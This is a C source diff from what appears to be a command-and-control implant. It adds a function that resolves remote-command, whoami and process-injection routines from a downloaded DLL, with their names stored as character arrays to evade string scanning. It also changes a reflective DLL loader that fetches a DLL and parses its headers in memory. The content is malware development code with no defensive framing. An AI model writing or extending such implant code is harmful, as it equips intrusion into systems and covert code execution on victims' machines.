@@ -359,7 +359,7 @@ BOOL AgentApiSet(_Out_ Agent* agent)
     }
     */
 
-    agent->api = _populate_api();
+    agent->api = _populate_base_api();
 
     return TRUE;
 }
@@ -752,7 +752,7 @@ BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pT
     return TRUE;
 }
 
-API _populate_api()
+API _populate_base_api()
 {
     API _api = {0};
     PAPI api = &_api;
@@ -856,8 +856,27 @@ API _populate_api()
     return _api;
 }
 
+ESG_STD_API _populate_esgStd_api(DLL* pEsgStdDll)
+{
+    ESG_STD_API esgStdApi = {0};
+
+    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
+    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
+    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
+
+    esgStdApi.RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
+    esgStdApi.Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
+    esgStdApi.injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);
+
+    return esgStdApi;
+}
+
 VOID AGENT_downloadPrimalDll(Agent* agent, PDLL pPrimalDll)
 {
+    #ifdef DEBUG
+    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
+    #endif
+
     pPrimalDll->pBuffer = NULL;
     pPrimalDll->Size = 0;
 
@@ -955,18 +974,12 @@ DLL AGENT_loadReflectiveDll(Agent* agent)
     // downloaded DLL with the reflective loader in it
     DLL primalDll = {.pBuffer = NULL, .Size = 0};
 
-    #ifdef DEBUG
-    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
-    #endif
-
-    AGENT_loadReflectiveDll(agent);
-
     AGENT_downloadPrimalDll(agent, &primalDll);
 
     #ifdef DEBUG
     CHAR ntHeader_f[] = { '1', 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0};
     // e_lfanew = offset to nt headers
-    ((PRINTF)agent->api.printf)(ntHeader_f, (UINT_PTR)(pPrimalDll->pBuffer) + ((PIMAGE_DOS_HEADER)pPrimalDll->pBuffer)->e_lfanew);
+    ((PRINTF)agent->api.printf)(ntHeader_f, (UINT_PTR)(primalDll.pBuffer) + ((PIMAGE_DOS_HEADER)primalDll.pBuffer)->e_lfanew);
     #endif
 
     DLL esgStdDll;
